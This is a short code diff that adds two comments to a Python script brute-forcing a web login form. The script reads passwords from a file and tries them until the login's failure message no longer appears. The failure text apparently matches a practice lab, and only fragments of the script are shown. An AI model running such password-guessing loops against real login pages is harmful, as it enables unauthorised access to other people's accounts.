@@ -6,6 +6,7 @@ initial_login()
 
 pswd = open("pass.txt", "r").read().split('\n')
 
+# Bruteforce password
 for psw in pswd:
     
     brute_cre = {
@@ -21,6 +22,7 @@ for psw in pswd:
     
     print("[-] Tried password: " + psw)
     
+    # Check if the password is right
     if "Username and/or password incorrect." not in response.text:
         print("[+] Right password is " + psw)
         break
